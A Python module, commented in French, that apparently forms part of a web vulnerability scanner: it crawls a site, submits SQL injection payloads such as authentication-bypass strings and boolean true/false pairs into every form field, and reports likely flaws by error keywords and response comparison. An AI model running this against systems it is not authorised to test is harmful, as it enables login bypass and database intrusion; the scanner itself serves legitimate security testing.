"""
Module de scan SQL Injection
Compatible avec l'architecture backend.worker.scanner
"""

from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin, urlparse
import time
from collections import deque
from difflib import SequenceMatcher
import re

# Configuration
MAX_PAGES = 40
DELAY = 0.05
CONFIDENCE_PRIORITY = {"HIGH": 3, "MEDIUM": 2, "LOW": 1, "UNKNOWN": 0}

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

def extract_text(html):
    """Extrait le texte visible d'une page HTML"""
    soup = BeautifulSoup(html, "html.parser")
    for element in soup(["script", "style", "noscript", "meta", "link"]):
        element.decompose()
    text = soup.get_text(separator=" ", strip=True)
    return text


def normalize_text(text):
    """Normalise le texte pour comparaison robuste"""
    text = re.sub(r'\s+', ' ', text)
    text = text.strip()
    return text


def confidence_rank(value):
    """Retourne un score numérique de confiance pour faciliter les tris/comparaisons."""
    normalized = str(value or "UNKNOWN").upper()
    return CONFIDENCE_PRIORITY.get(normalized, 0)


def merge_confidence(current, candidate):
    """Conserve le niveau de confiance le plus élevé entre deux valeurs."""
    current_normalized = str(current or "UNKNOWN").upper()
    candidate_normalized = str(candidate or "UNKNOWN").upper()
    return current_normalized if confidence_rank(current_normalized) >= confidence_rank(candidate_normalized) else candidate_normalized


def dedupe_payloads(payloads):
    """Supprime les doublons de payloads en conservant l'ordre d'apparition."""
    unique_payloads = []
    seen = set()

    for payload in payloads:
        normalized = str(payload or "").strip()
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        unique_payloads.append(normalized)

    return unique_payloads


def group_vulnerabilities_by_endpoint_and_type(vulnerabilities):
    """
    Regroupe les vulnérabilités SQL par vulnérabilité réelle:
    une vulnérabilité = (endpoint + type).
    """
    grouped = {}

    for vuln in vulnerabilities:
        endpoint = str(vuln.get("lien") or vuln.get("endpoint") or "").strip()
        vuln_type = str(vuln.get("type") or "SQLI").upper()
        key = (endpoint, vuln_type)

        if key not in grouped:
            grouped[key] = {
                "endpoint": endpoint,
                "lien": endpoint,  # rétrocompatibilité avec le format historique
                "type": vuln_type,
                "found_on": str(vuln.get("found_on") or endpoint),
                "confidence": str(vuln.get("confidence") or "UNKNOWN").upper(),
                "payloads": [],
                "count_payloads": 0,
                "method": str(vuln.get("method") or ""),
                "detection_technique": str(vuln.get("detection_technique") or ""),
                "status": vuln.get("status"),
                "indicator": str(vuln.get("indicator") or ""),
                "response_length": int(vuln.get("response_length") or 0),
                "response_length_max": int(vuln.get("response_length") or 0),
            }

        group = grouped[key]
        group["count_payloads"] += 1

        payload = str(vuln.get("payload") or "").strip()
        if payload:
            group["payloads"].append(payload)

        # Conserver la meilleure confiance observée dans le groupe.
        group["confidence"] = merge_confidence(group.get("confidence"), vuln.get("confidence"))

        # Enrichissement sans écraser les données existantes.
        if not group.get("found_on") and vuln.get("found_on"):
            group["found_on"] = str(vuln.get("found_on"))
        if not group.get("method") and vuln.get("method"):
            group["method"] = str(vuln.get("method"))
        if not group.get("detection_technique") and vuln.get("detection_technique"):
            group["detection_technique"] = str(vuln.get("detection_technique"))
        if not group.get("indicator") and vuln.get("indicator"):
            group["indicator"] = str(vuln.get("indicator"))
        if group.get("status") is None and vuln.get("status") is not None:
            group["status"] = vuln.get("status")

        response_length = int(vuln.get("response_length") or 0)
        if response_length > group.get("response_length_max", 0):
            group["response_length_max"] = response_length
            group["response_length"] = response_length

    normalized_groups = []
    for group in grouped.values():
        group["payloads"] = dedupe_payloads(group.get("payloads", []))
        # Champ historique conservé: premier payload de la liste.
        group["payload"] = group["payloads"][0] if group["payloads"] else ""
        normalized_groups.append(group)

    normalized_groups.sort(
        key=lambda item: (
            -confidence_rank(item.get("confidence")),
            -int(item.get("count_payloads", 0)),
            item.get("endpoint", ""),
            item.get("type", ""),
        )
    )

    return normalized_groups


# ============================================================================
# PARSER HTML
# ============================================================================

def parser_html(url):
    """Analyse une page HTML et extrait liens + formulaires"""
    try:   
        target_domain = urlparse(url).netloc 
        page = requests.get(url, timeout=10, allow_redirects=True)

        if page.status_code != 200:
            return {"error": f"Code HTTP invalide: {page.status_code}"}

        content_type = page.headers.get('Content-Type', '').lower()
        
        if 'text/html' not in content_type:
            return {"error": f"Contenu non HTML: {content_type}"}

        soup = BeautifulSoup(page.text, 'html.parser')

        # Extraction des liens
        links_a = soup.find_all('a')
        links = set()
        for link in links_a:
            href = link.attrs.get('href')
            if href:
                if href.startswith(('mailto:', 'tel:', 'javascript:', '#')):
                    continue
                full_url = urljoin(url, href) 
                link_domain = urlparse(full_url).netloc
                if link_domain == target_domain:
                    links.add(full_url)

        # Extraction des formulaires
        forms_from_html = soup.find_all('form')
        forms_data = []
        for form in forms_from_html:
            form_details = {}
            action = form.attrs.get("action")
            form_details["action_url"] = urljoin(url, action) if action else url
            
            if form_details["action_url"].startswith(('javascript:', 'mailto:', '#')):
                continue
            
            form_details["method"] = form.attrs.get("method", "get").lower()
            
            inputs_list = []
            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_name = input_tag.attrs.get("name")
                input_type = input_tag.attrs.get("type", "text")
                input_value = input_tag.attrs.get("value", "")
                if input_name:
                    inputs_list.append({
                        "name": input_name, 
                        "type": input_type,
                        "value": input_value
                    })
            
            form_details["inputs"] = inputs_list
            form_details["found_on_page"] = url
            forms_data.append(form_details)

        return {
            "url": url,
            "title": soup.title.string if soup.title else "Sans titre",
            "links_found": list(links),
            "forms_found": forms_data
        }

    except requests.RequestException as e:
        return {"error": f"Erreur de connexion : {e}"}


# ============================================================================
# CRAWLER
# ============================================================================

def crawler(start_url, max_pages=MAX_PAGES):
    """Crawle le site en breadth-first search"""
    to_visit = deque([start_url])
    visited = set()
    all_forms = []
    
    while to_visit and len(visited) < max_pages:
        current_url = to_visit.popleft()
        
        if current_url in visited:
            continue
        
        visited.add(current_url)
        result = parser_html(current_url)
        
        if "error" in result:
            continue
        
        if result['forms_found']:
            all_forms.extend(result['forms_found'])
        
        for link in result['links_found']:
            if link not in visited:
                to_visit.append(link)
        
        time.sleep(DELAY)
    
    return all_forms, visited


# ============================================================================
# TESTS SQL INJECTION
# ============================================================================

def tester_sqli_form(form, payloads):
    """Teste les injections SQL avec détection par mots-clés"""
    action_url = form['action_url']
    method = form['method']
    
    vulnerabilities = []
    
    for payload in payloads:
        data = {}
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'password', 'email', 'search']:
                data[input_field['name']] = payload
            else:
                data[input_field['name']] = input_field['value']
        
        try:
            if method == 'post':
                response = requests.post(action_url, data=data, timeout=10, allow_redirects=True)
            else:
                response = requests.get(action_url, params=data, timeout=10, allow_redirects=True)
            
            content_lower = response.text.lower()
            
            error_indicators = [
                'sql syntax', 'mysql', 'mysqli', 'postgresql', 'oracle',
                'sqlite', 'microsoft sql', 'odbc', 'jdbc', 'warning: mysql',
                'error in your sql', 'you have an error in your sql syntax'
            ]
            
            success_indicators = [
                'welcome', 'dashboard', 'logout', 'successfully logged in'
            ]
            
            found_error = None
            found_success = None
            
            for indicator in error_indicators:
                if indicator in content_lower:
                    found_error = indicator
                    break
            
            for indicator in success_indicators:
                if indicator in content_lower:
                    found_success = indicator
                    break
            
            if found_error or found_success:
                vuln = {
                    'lien': action_url,
                    'found_on': form['found_on_page'],
                    'payload': payload,
                    'status': response.status_code,
                    'type': 'ERROR_BASED' if found_error else 'AUTHENTICATION_BYPASS',
                    'method': 'KEYWORD_DETECTION',
                    'indicator': found_error or found_success,
                    'confidence': 'HIGH',
                    'response_length': len(response.text)
                }
                vulnerabilities.append(vuln)
        
        except requests.RequestException:
            pass
        
        time.sleep(0.03)
    
    return vulnerabilities


def tester_sqli_differentiel(form):
    """Teste les injections SQL avec analyse différentielle"""

# Question 1 (BASELINE) : "test"           → Réponse normale
# Question 2 (TRUE)     : "' OR '1'='1'--" → Réponse si vulnérable (condition VRAIE)
# Question 3 (FALSE)    : "' AND '1'='0'--"→ Réponse si vulnérable (condition FAUSSE)
# Si le site est vulnérable :

# Réponse TRUE ≠ Réponse FALSE (comportement différent)
# Réponse FALSE ≈ BASELINE (comportement normal)


    action_url = form['action_url']
    method = form['method']
    
    vulnerabilities = []
    
    # BASELINE
    data_normal = {}
    for input_field in form['inputs']:
        if input_field['type'] in ['text', 'password', 'email', 'search']:
            data_normal[input_field['name']] = "test"
        else:
            data_normal[input_field['name']] = input_field['value']
    
    try:
        if method == 'post':
            response_normal = requests.post(action_url, data=data_normal, timeout=10, allow_redirects=True)
        else:
            response_normal = requests.get(action_url, params=data_normal, timeout=10, allow_redirects=True)
        
        baseline_html = response_normal.text
        baseline_text = normalize_text(extract_text(baseline_html))
        
    except requests.RequestException:
        return vulnerabilities
    
    # Tests TRUE/FALSE
    test_pairs = [
        ("' OR '1'='1'--", "' AND '1'='0'--"),
        ("' OR 1=1--", "' AND 1=0--"),
    ]
    
    for payload_true, payload_false in test_pairs:
        data_true = {}
        data_false = {}
        
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'password', 'email', 'search']:
                data_true[input_field['name']] = payload_true
                data_false[input_field['name']] = payload_false
            else:
                data_true[input_field['name']] = input_field['value']
                data_false[input_field['name']] = input_field['value']
        
        try:
            if method == 'post':
                response_true = requests.post(action_url, data=data_true, timeout=10, allow_redirects=True)
                response_false = requests.post(action_url, data=data_false, timeout=10, allow_redirects=True)
            else:
                response_true = requests.get(action_url, params=data_true, timeout=10, allow_redirects=True)
                response_false = requests.get(action_url, params=data_false, timeout=10, allow_redirects=True)
            
            html_true = response_true.text
            text_true = normalize_text(extract_text(html_true))
            html_false = response_false.text
            text_false = normalize_text(extract_text(html_false))
            
            # Comparaisons
            ratio_text_tf = SequenceMatcher(None, text_true, text_false).ratio()
            ratio_text_fn = SequenceMatcher(None, text_false, baseline_text).ratio()
            ratio_html_tf = SequenceMatcher(None, html_true, html_false).ratio()
            ratio_html_fn = SequenceMatcher(None, html_false, baseline_html).ratio()
            
            diff_len_text_true = abs(len(text_true) - len(baseline_text))
            diff_len_text_false = abs(len(text_false) - len(baseline_text))
            
            # Décision
            detected = False
            confidence = None
            detection_technique = None
            
            if ratio_text_tf < 0.80 and ratio_text_fn > 0.95:
                detected = True
                confidence = 'HIGH'
                detection_technique = 'TEXT_COMPARISON'
            
            elif diff_len_text_true > 50 and diff_len_text_false < 10:
                detected = True
                confidence = 'HIGH'
                detection_technique = 'TEXT_LENGTH'
            
            elif ratio_text_tf > 0.90 and ratio_html_tf < 0.70:
                detected = True
                confidence = 'MEDIUM'
                detection_technique = 'HTML_STRUCTURE'
            
            elif ratio_html_tf < 0.85 and ratio_html_fn > 0.95:
                detected = True
                confidence = 'LOW'
                detection_technique = 'HTML_RAW'
            
            if detected:
                vuln = {
                    'lien': action_url,
                    'found_on': form['found_on_page'],
                    'payload': payload_true,
                    'status': response_true.status_code,
                    'type': 'BOOLEAN_BASED_BLIND',
                    'method': 'DIFFERENTIAL_ANALYSIS',
                    'detection_technique': detection_technique,
                    'confidence': confidence,
                    'ratio_text_tf': f"{ratio_text_tf:.1%}",
                    'ratio_text_fn': f"{ratio_text_fn:.1%}",
                    'response_length': len(html_true)
                }
                vulnerabilities.append(vuln)
        
        except requests.RequestException:
            pass
        
        time.sleep(0.05)
    
    return vulnerabilities


# ============================================================================
# FUZZER
# ============================================================================

def fuzzer(forms, payloads, use_differential=True):
    """Phase de fuzzing"""
    all_vulns = []
    
    for form in forms:
        # Méthode 1 : Mots-clés
        vulns_keyword = tester_sqli_form(form, payloads)
        if vulns_keyword:
            all_vulns.extend(vulns_keyword)
        
        # Méthode 2 : Différentielle
        if use_differential:
            vulns_diff = tester_sqli_differentiel(form)
            if vulns_diff:
                all_vulns.extend(vulns_diff)
    
    return all_vulns


# ============================================================================
#  FONCTION PRINCIPALE POUR L'INTÉGRATION
# ============================================================================

def scan(url: str) -> dict:
    """
    Point d'entrée principal pour le système de scan
    
    Args:
        url: URL du site à scanner
        
    Returns:
        dict: Résultats formatés pour le système de scan
        
    Format de retour:
    {
        "status": "success" | "error",
        "target": "https://example.com",
        "pages_crawled": 15,
        "forms_tested": 3,
        "vulnerabilities_found": 2,
        "vulnerability_rate": "66.7%",
        "confidence_breakdown": {
            "HIGH": 2,
            "MEDIUM": 0,
            "LOW": 0
        },
        "vulnerabilities": [
            {
                "url": "https://example.com/login",
                "type": "ERROR_BASED",
                "payload": "' OR '1'='1",
                "confidence": "HIGH",
                "method": "KEYWORD_DETECTION",
                ...
            }
        ],
        "summary": "2 vulnérabilités HIGH trouvées sur 3 formulaires (66.7%)"
    }
    """
    
    try:
        # Payloads à tester
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "admin' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' OR '1'='1",
            "admin' #",
            "' OR 'a'='a"
        ]
        
        # PHASE 1 : Crawling
        forms, pages = crawler(url, max_pages=MAX_PAGES)
        
        # PHASE 2 : Fuzzing
        vulns = fuzzer(forms, payloads, use_differential=True)
        
        # PHASE 3 : Analyse des résultats
        grouped_vulns = group_vulnerabilities_by_endpoint_and_type(vulns)
        vulnerable_forms = len(set([v.get('endpoint') for v in grouped_vulns if v.get('endpoint')]))
        vulnerability_rate = (vulnerable_forms / len(forms) * 100) if forms else 0

        total_vulnerabilities = len(grouped_vulns)
        total_payloads = len(vulns)

        # Breakdown par confiance (au niveau des vulnérabilités réelles regroupées)
        high_conf = [v for v in grouped_vulns if str(v.get('confidence')).upper() == 'HIGH']
        medium_conf = [v for v in grouped_vulns if str(v.get('confidence')).upper() == 'MEDIUM']
        low_conf = [v for v in grouped_vulns if str(v.get('confidence')).upper() == 'LOW']

        # Générer un résumé
        if grouped_vulns:
            summary = (
                f"{total_vulnerabilities} vulnérabilité(s) trouvée(s) "
                f"({total_payloads} payload(s) exploitable(s)) sur {len(forms)} formulaire(s) "
                f"({vulnerability_rate:.1f}%)"
            )
            if high_conf:
                summary += f" - {len(high_conf)} HIGH"
            if medium_conf:
                summary += f", {len(medium_conf)} MEDIUM"
            if low_conf:
                summary += f", {len(low_conf)} LOW"
        else:
            summary = f"Aucune vulnérabilité détectée sur {len(forms)} formulaire(s)"

        # Retour formaté
        return {
            "status": "success",
            "target": url,
            "pages_crawled": len(pages),
            "forms_tested": len(forms),
            "vulnerabilities_found": total_vulnerabilities,  # rétrocompatibilité
            "total_vulnerabilities": total_vulnerabilities,
            "total_payloads": total_payloads,
            "vulnerability_rate": f"{vulnerability_rate:.1f}%",
            "confidence_breakdown": {
                "HIGH": len(high_conf),
                "MEDIUM": len(medium_conf),
                "LOW": len(low_conf)
            },
            "vulnerabilities": grouped_vulns,
            "summary": summary
        }
        
    except Exception as e:
        # En cas d'erreur, retourner un format standardisé
        return {
            "status": "error",
            "target": url,
            "error": str(e),
            "error_type": type(e).__name__,
            "summary": f"Erreur lors du scan : {str(e)}"
        }


# ============================================================================
# TEST STANDALONE (optionnel)
# ============================================================================

if __name__ == "__main__":
    # Test du module en mode standalone
    import json
    
    test_url = "https://demo.testfire.net"
    print(f"Test du scan SQL injection sur : {test_url}\n")
    
    result = scan(test_url)
    
    print(json.dumps(result, indent=2, ensure_ascii=False))
